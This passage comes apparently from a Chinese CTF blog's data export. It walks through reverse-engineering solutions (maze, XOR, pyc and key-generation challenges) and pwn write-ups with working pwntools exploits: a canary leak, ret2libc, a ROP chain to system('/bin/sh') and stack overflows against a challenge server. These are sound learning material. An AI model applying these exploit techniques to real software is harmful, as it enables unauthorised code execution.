*********&quot;); v1 = &amp;v3; printf(&quot;Please input your key:\\n&quot;); gets(&amp;v5); if ( strlen(&amp;v5) != 22 ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(1); &#125; v11 = 0; do &#123; v10 = *(&amp;v5 + v11); if ( v10 != &apos;k&apos; &amp;&amp; v10 != &apos;j&apos; &amp;&amp; v10 != &apos;h&apos; &amp;&amp; v10 != &apos;l&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(2); &#125; v9 = *(&amp;v5 + v11); switch ( v9 ) &#123; case &apos;h&apos;: if ( --v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || (result = (char *)*v1, result == (char *)&apos;*&apos;) ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; if ( *v1 == &apos;#&apos; ) &#123;LABEL_41: printf(&quot;Good!\\n&quot;); system(&quot;pause&quot;); exit(0); &#125; break; case &apos;j&apos;: v1 += 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = (char *)*v1; if ( result == (char *)&apos;#&apos; ) goto LABEL_41; break; case &apos;k&apos;: v1 -= 8; if ( v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(3); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; default: if ( ++v1 &lt; &amp;v2 || v1 &gt; &amp;v4 || *v1 == &apos;*&apos; ) &#123; printf(&quot;Sorry you are wrong!\\n&quot;); system(&quot;pause&quot;); exit(4); &#125; result = v1; if ( *v1 == &apos;#&apos; ) goto LABEL_41; break; &#125; ++v11; &#125; while ( v11 &lt; 25 ); return result; 分析得j是向下，k是向上，h向左，l向右，不能走到*上，走到#就走出了迷宫，结合地图得到答案。 10000000ida打开，main函数： 12345678910111213141516171819202122232425262728__main();v17 = 0;memset(&amp;v18, 0, 0x10u);memset(&amp;v4, 0, 0x14u);v4 = -26;v5 = -20;v6 = -31;v7 = -25;v8 = -70;v9 = -12;v10 = -27;v11 = -13;v12 = -12;v13 = -12;v14 = -27;v15 = -13;v16 = -12;v19 = 0;puts(asc_403024);scanf(&quot;%s&quot;, &amp;v17);LOBYTE(v19) = 0;while ( *((_BYTE *)&amp;v17 + v19) ) *((_BYTE *)&amp;v17 + v19++) |= 0x80u;if ( !strcmp((const char *)&amp;v17, &amp;v4) ) printf(&quot;good&quot;);else printf(&quot;wrong&quot;);return 0; 逻辑很简单，输入|=0x80后与v4相等就ok了，不过不清楚|可不可以逆运算，来一发爆破吧： 12345678import stringv4=[0xe6,0xec,0xe1,0xe7,0xba,0xf4,0xe5,0xf3,0xf4,0xf4,0xe5,0xf3,0xf4]flag=&quot;&quot;for i in range(len(v4)): for j in string.printable: if ord(j)|0x80==v4[i]: flag+=jprint flag 需要注意的是ida打开时v4的值默认显示的是十进制负数……如果用这个来爆破是不会得到结果的，转换成十六进制后变成正数（鶸也不知道为啥），随后就可以得到flag了。","categories":[],"tags":[]},{"title":"实验吧-1","slug":"实验吧-1","date":"2018-10-22T14:37:21.000Z","updated":"2018-10-22T14:37:34.637Z","comments":true,"path":"2018/10/22/实验吧-1/","link":"","permalink":"http://yoursite.com/2018/10/22/实验吧-1/","excerpt":"","text":"证明自己吧ida打开，定位到关键函数： 1234567891011121314151617181920212223242526272829303132 v5 = dword_40708C; v6 = dword_407090; v8 = word_407098; v9 = byte_40709A; v7 = dword_407094; if ( strlen(a1) == strlen((const char *)&amp;v5) ) &#123; v1 = 0; if ( strlen(a1) != 0 ) &#123; do a1[v1++] ^= 0x20u; while ( v1 &lt; strlen(a1) ); &#125; v2 = 0; if ( strlen((const char *)&amp;v5) != 0 ) &#123; do *((_BYTE *)&amp;v5 + v2++) -= 5; while ( v2 &lt; strlen((const char *)&amp;v5) ); &#125; v3 = 0; if ( strlen((const char *)&amp;v5) == 0 ) return 1; while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) ) &#123; if ( ++v3 &gt;= strlen((const char *)&amp;v5) ) return 1; &#125; &#125; return 0;&#125; 可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。 逆运算脚本如下： 12345678v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]temp=[]for i in v5: i-=5 i^=0x20 key.append(i)flag=&apos;&apos;.join([chr(i) for i in temp])print flag NSCTF Reverse 500pyc文件直接在线反编译一波： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394data = &quot;M,\\x1d-\\x18&#125;E&apos;\\x1ezN~\\x1b*\\x19+\\x12%\\x1d-&quot; + &apos;I\\x7fM(I&#123;I\\x7fJ.\\x16wWcRj\\x0e6\\x0fn&apos; + &apos;Zo\\nn\\x0fk\\t1R7\\x03g\\x067\\x00eUb\\x043&apos; + &apos;\\x014\\x071Rr\\x14x\\x19~D?q&quot;a5s,A%&apos; + &quot;\\x10&apos;\\x11uLyA%\\x1d|DrFv\\x12t\\x11#B&amp;&quot; + &apos;GsKzK*O)\\x1c%GuC&gt;\\x1e\\x7f\\x1b+\\x19*&apos; + &apos;\\x1e&amp;\\x14-\\x1f/\\x1axAqBq@yO-LtE&#125;&apos; + &apos;\\x1b,MuBp\\x12&apos;import osimport sysimport structimport cStringIOimport stringimport disimport marshalimport typesimport randomcount = 0def reverse(string): return string[::-1]data_list = list(reverse(data)[1:])def decrpyt(c, key2): global count data_list[count] = c ^ key2 count += 1def GetFlag1(): key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag2(): key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag3(): key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag4(): global count key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) count = 0 for c in data_list[::-1]: print chr(c), def GetFlag5(): key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-12]: print chr(c), GetFlag1() 直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如0f aa这样的指令时会变成\\xfa\\xa*这样，就会导致错位⽽而解不出flag。 这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为： 14D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012 然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。 NSCTF Reverse 400py2exe的逆向，参考PyInstaller Extractor安装和使用方法 在reverse03里找到了一些代码： 12345678910111213141516171819202122data=\\&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+\\&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+\\&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;&apos;&apos;&apos;char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;int _tmain(int argc, _TCHAR* argv[])&#123; printf(&quot;%d\\n&quot;, strlen(buf)); char key = &apos;\\x0b&apos;; buf[47] ^= key; for (int i = 1; i &lt; 48; i++) &#123; buf[48 - i - 1] ^= buf[48 - i]; &#125; return 0;&#125;&apos;&apos;&apos;print &quot;Revese it?????????&quot; 直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。 后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本： 12345678data=&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;temp=list(data)for i in range(0,len(temp)-2): temp[i]=chr(ord(temp[i])^ord(temp[i+1]))temp[47]=chr(ord(temp[47])^0x0b)flag=&apos;&apos;.join(i for i in temp)print flag bin100(ebCTF 2013)一个掷🎲小游戏，掷出需要的数字就能得到flag。 用od打开，字符串搜索，定位到： 120040192B /75 5E jnz short Dice.0040198B0040192D . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ; [*] You rolled a three! Good! 可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。 该题不简单一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。 文本搜索一下无效，找到了关键函数： 12345678910111213141516171819202122232425262728String[0] = 0;memset(&amp;String[1], 0, 0x1Cu);v3 = 0;v4 = 0;String1 = 0;memset(&amp;v10, 0, 0x1Cu);v11 = 0;v12 = 0;String2 = 0;memset(&amp;v6, 0, 0x1Cu);v7 = 0;v8 = 0;if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 ) return 1;GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);v1 = 0;if ( strlen(String) != 0 )&#123; do &#123; *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33; ++v1; &#125; while ( v1 &lt; strlen(String) );&#125;strcpy(String, &quot;Happy@&quot;);lstrcatA(String, &amp;String2);return lstrcmpA(&amp;String1, String) != 0; 如果这个函数返回1的话就是注册码正确了。输入用户名后，注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33，再在前面加上Happy@就得到注册码了。 脚本如下： 12345username=&quot;hello&quot;string2=&quot;&quot;for i in range(len(username)): string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)print &quot;Happy@&quot;+string2 这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。","categories":[],"tags":[]},{"title":"geek-no-gdb","slug":"geek-no-gdb","date":"2018-10-19T08:01:32.000Z","updated":"2018-10-19T08:19:30.535Z","comments":true,"path":"2018/10/19/geek-no-gdb/","link":"","permalink":"http://yoursite.com/2018/10/19/geek-no-gdb/","excerpt":"","text":"题目地址 话说好像是要用gdb调试的，然而之前一直没用过gdb，对着教程弄了一会，也许是因为编译时没有-g导致调试不起来，只能拖进ida看看，发现大部分函数也是能看的，不过最关键的一段函数却无法使用f5，只能怼汇编了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970sub_400716 proc near ; CODE XREF: main+B0↓ps = qword ptr -68hvar_54 = dword ptr -54hs2 = byte ptr -50hvar_48 = qword ptr -48hvar_40 = qword ptr -40hvar_38 = qword ptr -38hvar_30 = qword ptr -30hvar_28 = word ptr -28hvar_18 = qword ptr -18h; __unwind &#123; push rbp mov rbp, rsp nop sub rsp, 68h mov [rbp+s], rdi mov rax, fs:28h mov [rbp+var_18], rax xor eax, eax mov rax, &apos;kVPSOwmg&apos; mov qword ptr [rbp+s2], rax mov rax, &apos;YkQ\\@kQV&apos; mov [rbp+var_48], rax mov rax, &apos;QC[Dk@G[&apos; mov [rbp+var_40], rax mov rax, &apos;kg&#123;kXARF&apos; mov [rbp+var_38], rax mov rax, &apos;FQSSAVQP&apos; mov [rbp+var_30], rax mov [rbp+var_28], &apos;I&apos; mov [rbp+var_54], 0 jmp short loc_4007A3; ---------------------------------------------------------------------------loc_400787: ; CODE XREF: sub_400716+A2↓j mov eax, [rbp+var_54] cdqe movzx eax, [rbp+rax+s2] xor eax, 34h mov edx, eax mov eax, [rbp+var_54] cdqe mov [rbp+rax+s2], dl add [rbp+var_54], 1loc_4007A3: ; CODE XREF: sub_400716+6F↑j mov eax, [rbp+var_54] movsxd rbx, eax mov rax, [rbp+s] mov rdi, rax ; s call _strlen cmp rbx, rax jb short loc_400787 lea rdx, [rbp+s2] mov rax, [rbp+s] mov rsi, rdx ; s2 mov rdi, rax ; s1 call _strcmp test eax, eax jnz short loc_4007DD mov edi, offset s ; &quot;Yeah!Prison break!&quot; call _puts jmp short loc_4007E7; ---------------------------------------------------------------------------loc_4007DD: ; CODE XREF: sub_400716+B9↑j mov edi, offset aNoYouFailed ; &quot;No!You Failed&quot; call _puts 一通操作就是把一开始的输入读入s，然后再把一个字符串读入s2，如果对于s的每一位异或0x34后与s2相等就ok啦，所以flag=s2^0x34，逆运算脚本如下： 123s2=&quot;gmwOSPVkVQk@\\QkY[G@kD[CQFRAXk&#123;gkPQVASSQFI&quot;flag=&apos;&apos;.join([chr(ord(i)^0x34) for i in s2])print flag 不知道怎么用gdb真是鶸啊orz","categories":[],"tags":[]},{"title":"CNSSrecruit-3","slug":"CNSSrecruit-3","date":"2018-10-15T15:05:31.000Z","updated":"2018-10-20T10:57:54.205Z","comments":true,"path":"2018/10/15/CNSSrecruit-3/","link":"","permalink":"http://yoursite.com/2018/10/15/CNSSrecruit-3/","excerpt":"","text":"GuessPigeon3开了canary保护，提供了libc.so文件。参考文章write函数泄露+用地址跳回重执行主函数 guess函数： 123456789101112131415unsigned int guess()&#123; char buf; // [esp+8h] [ebp-70h] unsigned int v2; // [esp+6Ch] [ebp-Ch] v2 = __readgsdword(0x14u); memset(&amp;buf, 0, 0x64u); puts(&quot;You You have two chances. Please input your guess:&quot;); read(0, &amp;buf, 0x100u); printf(&quot;You guessed the pigeon number is %s .\\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf); puts(&quot;Please input your guess again:&quot;); read(0, &amp;buf, 0x100u); puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;); return __readgsdword(0x14u) ^ v2;&#125; v2就是canary，buf存在栈溢出。 ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。 第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。 然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。 这样再次进入main函数之后，就可以开shell了。脚本如下： 12345678910111213141516171819202122232425262728293031from pwn import *elf1=ELF(&quot;./GuessPigeon3&quot;)elf2=ELF(&quot;./libc.so.6&quot;)plt_write=elf1.plt[&quot;write&quot;]got_write=elf1.got[&quot;write&quot;]system_libc=0x3ada0bin_sh_libc=0x15ba0bsh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&quot;token:&quot;)sh.sendline(&quot;GuessPigeon3&quot;)sh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)sh.recvuntil(&quot;abcde&quot;)sh.recv(1)canary=&apos;\\x00&apos;+sh.recv(3)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)sh.sendline(payload)sh.recvuntil(&apos;bye~\\n&apos;)leak=u32(sh.recv(4))libc_base=leak-elf2.symbols[&apos;write&apos;]system=libc_base+system_libcbin_sh=libc_base+bin_sh_libcsh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;1&apos;)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)sh.sendline(payload)sh.recv()sh.interactive() 发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。 123sh.sendline(&quot;cd ..&quot;)sh.sendline(&quot;cat flag_GuessPigeon3&quot;)sh.recv() 诡异的修罗铭文","categories":[],"tags":[]},{"title":"CNSSrecruit-2","slug":"CNSSrecruit-2","date":"2018-10-14T14:32:19.000Z","updated":"2018-10-15T13:57:51.975Z","comments":true,"path":"2018/10/14/CNSSrecruit-2/","link":"","permalink":"http://yoursite.com/2018/10/14/CNSSrecruit-2/","excerpt":"","text":"childNc主函数如下： 123456789101112131415161718v8 = __readfsqword(0x28u);setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL);puts(&quot;Please input two right numbers:&quot;);__isoc99_scanf(&quot;%d %d&quot;, &amp;v4, &amp;v5);v6 = v4 + v5;v7 = v4 - v5;if ( v4 + v5 != 19 || v7 != 5 )&#123; puts(&quot;Try again~&quot;);&#125;else&#123; puts(&quot;Gooood!you get shell!Can you find the flag?\\n&quot;); system(&quot;/bin/sh&quot;);&#125;return 0; 可以发现输入12和7就可以获得shell，然而ls并没有发现flag文件，原来是隐藏了起来，用ls -f查看隐藏文件，在..里找到flag。 12345678910ls -fstartpwn.sh.startdocker.sh..childNccd ..lsbinflag_childNc GuessPigeon程序自带getshell函数，所以只要找一个栈溢出然后把返回地址修改成getshell的地址就ok了，脚本如下 一开始没看一下有没有开什么保护啥的，结果试了半天也没能成功……后来发现开了canary保护，现场百度一波，找到了大佬的教程Linux pwn入门教程(9)——stack canary与绕过的思路，不过研究了一晚上发现这一题并不需要用到这篇教程里的东西….. 主程序如下： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int v4; // ST1C_4 init(); puts(&quot;Welcome to CNSS Recruit 2018\\n&quot;); puts(&quot;Let&apos;s guess the pigeon number together!&quot;); v3 = time(0); srand(v3); v4 = rand(); guess(v4); return 0;&#125; v3就是canary的值，guess函数如下： 123456789101112131415161718unsigned int __cdecl guess(int a1)&#123; char nptr; // [esp+8h] [ebp-70h] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(&quot;Please input your guess:&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;nptr); if ( atoi(&amp;nptr) == a1 ) &#123; puts(&quot;My Gooood!You guessed the pigeon number!!&quot;); getshell(); &#125; else &#123; printf(&quot;You are wrong!The pigeon&apos;s number is %d\\n try again~&quot;, a1); &#125; return __readgsdword(0x14u) ^ v3; 栈中各变量的分布顺序： 123nptrcanarya1 这里可以通过scanf的栈溢出来修改a1，也就是v4的值。atoi()函数是将字符串转化为整形，例如’0’就会被转换成0，所以scanf输入时我选择全部用’0’填充，到了a1的值时使用p32(0)把a1修改为0，这样就使得guess函数中的判断成立，在函数结束之前进入了shell，无所谓是不是触发canary保护了。 脚本如下： 123456789from pwn import *elf=ELF(&quot;2&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)print sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon&apos;)print sh.recvuntil(&apos;guess:&apos;)payload=&apos;0&apos;*0x78+p32(0)sh.sendline(payload)sh.interactive() flag文件依旧是隐藏在..文件夹中，不过既然题目是在同一个平台，前面提示了后面也就不会很懵逼了。 GuessPigeon2本题参考了i春秋上面大佬的教程Linux pwn入门教程(3)——ROP技术 主函数： 123456789101112int result; // eaxchar buf; // [rsp+0h] [rbp-70h]puts(&quot;Please input your guess:&quot;);__isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;buf);puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;);puts(&quot;Do you want to get hint? yes/no?&quot;);read(0, &amp;buf, 0x100uLL);result = strcmp(&amp;buf, &quot;yes&quot;);if ( !result ) result = printf(&quot;Do you know \\&quot;%s\\&quot;\\n&quot;, s);return result; 函数列表里有system函数，只是参数不是/bin/sh。buf存在栈溢出，并且有两次输入都是输入到buf，所以第一次输入随便输入点什么，第二次输入时利用栈溢出调用system函数，并且发现s中储存的字符串正好是/bin/sh，可以用来作为system函数的参数。但是这个和之前做的那题有system函数没参数的不一样，这题是64位的，那题是32位的。 “在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。” 所以我们需要找一个命令pop rdi,这里可以使用ROPgadget ROPgadget --binary 1 | grep &quot;pop rdi&quot; 这里找到的地址是0x400933,同时在ida中查看到call system的地址是0x4007cf,s的地址是0x600e20，利用这些就可以编写payload。 脚本如下： 1234567891011from pwn import *elf=ELF(&quot;1&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon2&apos;)sh.recvuntil(&apos;Please input your guess:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;yes/no?&apos;)payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)sh.sendline(payload)sh.interactive() 成功进入shell，这题的flag也是藏在了..文件夹里，cd ..之后cat flag。","categories":[],"tags":[]},{"title":"CNSSrecruit-1","slug":"CNSSrecruit-1","date":"2018-10-13T08:28:12.000Z","updated":"2018-10-13T11:51:00.118Z","comments":true,"path":"2018/10/13/CNSSrecruit-1/","link":"","permalink":"http://yoursite.com/2018/10/13/CNSSrecruit-1/","excerpt":"","text":"RE签到题shift+f12查看字符串 2048一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD 海南鸽子关键部分： 12345678910scanf(&quot;%19s&quot;, &amp;v6);sub_401005(&amp;v6, (int)&amp;v2);for ( i = 0; i &lt; strlen(&amp;v2); ++i ) --*(&amp;v2 + i);if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) ) printf(&quot;Success!\\n\\n&quot;);else printf(aWrongFlagO);system(&quot;pause&quot;);return 0; sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。 推箱子游戏题目直接提示了关键点： 12345678910111213141516171819202122232425262728293031323334353637383940414243stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;); if ( stream ) &#123; ptr = 0LL; v6 = 0LL; v0 = 16LL; fread(&amp;ptr, 0x10uLL, 1uLL, stream); fclose(stream); puts(&quot;-----Score Board-----&quot;); LODWORD(v3) = 0; while ( (signed int)v3 &lt;= 3 ) &#123; v0 = (unsigned int)(v3 + 1); printf(&quot;level%d: %d steps\\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3); LODWORD(v3) = v3 + 1; &#125; if ( ptr == 0x2500000011LL ) &#123; v7 = -8977570383032666059LL; v8 = 4503996766676335161LL; v9 = 51; v10 = 105; v11 = 52; v12 = -122; v13 = 78; v14 = 105; v15 = 102; v16 = 67; v17 = -124; v18 = 108; v19 = 58; v20 = 51; v21 = 75; v22 = -106; v23 = 0; for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) ) &#123; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u; &#125; v0 = (unsigned __int64)&amp;v7; printf(&quot;\\n%s\\n&quot;, &amp;v7, v3); &#125; 这里有两个选择，一是根据ptr==0x2500000011，将score.data中的数据改成1100 0000 2500 0000 0000 0000 0000 0000,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。 源码审计源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char input[1024] = &#123; 0 &#125;;int aaa(char* b)&#123; int v3 = 0,v2 = 0; char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;; int i = 0; int i_ = 0;1: int p__ = key[i ++]; if (p__== 0) goto 1; if (p__== 0x21) goto 2; if (p__== 0x32) goto 3; if (p__== 0x43) goto 4; if (p__== 0x54) goto 5; if (p__== 0x65) goto 6;3: v2 = input[i_ ++]; goto 7;4: v3 = v3^0x66^v2; goto 1;2: v3 = key[i ++]; goto 7;7: goto 1;5: if (v3== 0) goto 1;6: return v3;&#125;int main()&#123; printf(&quot;Please &quot;); printf(&quot;input &quot;); printf(&quot;flag:&quot;); scanf(&quot;%s&quot;, input); if(strlen(input)==15) goto start;start: int p = aaa(input); if (p==0) &#123; printf(&quot;\\no yes\\n&quot;); system(&quot;pause&quot;); return 0; &#125;end: printf(&quot;\\nnonono\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 分析可以发现，根据key中的值，对input进行处理之后如果v3=0的话就可以了。key中0x21,****,0x32,0x43,0x54构成一个循环，操作是使得****处的值异或input中的值再异或0x66等于0，所以input=****^0x66，运算脚本如下： 123key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]flag=&quot;&quot;.join([chr(i^0x66)for i in key])print flag","categories":[],"tags":[]},{"title":"sus-unpackme","slug":"sus-unpackme","date":"2018-10-11T15:20:59.000Z","updated":"2018-10-21T14:18:49.043Z","comments":true,"path":"2018/10/11/sus-unpackme/","link":"","permalink":"http://yoursite.com/2018/10/11/sus-unpackme/","excerpt":"","text":"peid查壳upx壳，尝试手动脱壳。然而对着教程发现，用od载入时我的od载入的一开始并不是push ad，也就一直没有办法脱壳。百度了接近半个晚上才知道，原来虚拟机里用od时不要把要载入的文件放在共享文件夹里，否则就会出现这种状况，把unpackme.exe拖到虚拟机文件夹里后脱壳成功。 定位到关键函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465pdwDataLen = 16;if ( a2 == 514 )&#123; v4 = GetParent(hWnd); v5 = GetDlgItemTextA(v4, 101, &amp;String, 63); if ( v5 ) &#123; phProv = 0; phHash = 0; if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) || !CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) || !CryptHashData(phHash, (const BYTE *)&amp;String, v5, 0) || !CryptGetHashParam(phHash, 2u, (BYTE *)pbData, &amp;pdwDataLen, 0) ) &#123; ExitProcess(1u); &#125; CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); v7 = pbData; v8 = dword_4128A0; v9 = 12; while ( *(_DWORD *)v7 == *v8 ) &#123; v7 += 4; ++v8; v10 = v9 &lt; 4; v9 -= 4; if ( v10 ) &#123; v11 = String; v12 = 0; v13 = 3; v14 = 2; do &#123; *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF]; *(&amp;v23 + v12) = v11 ^ byte_410A81[v12] ^ pbData[((_BYTE)v14 - 1) &amp; 0xF]; 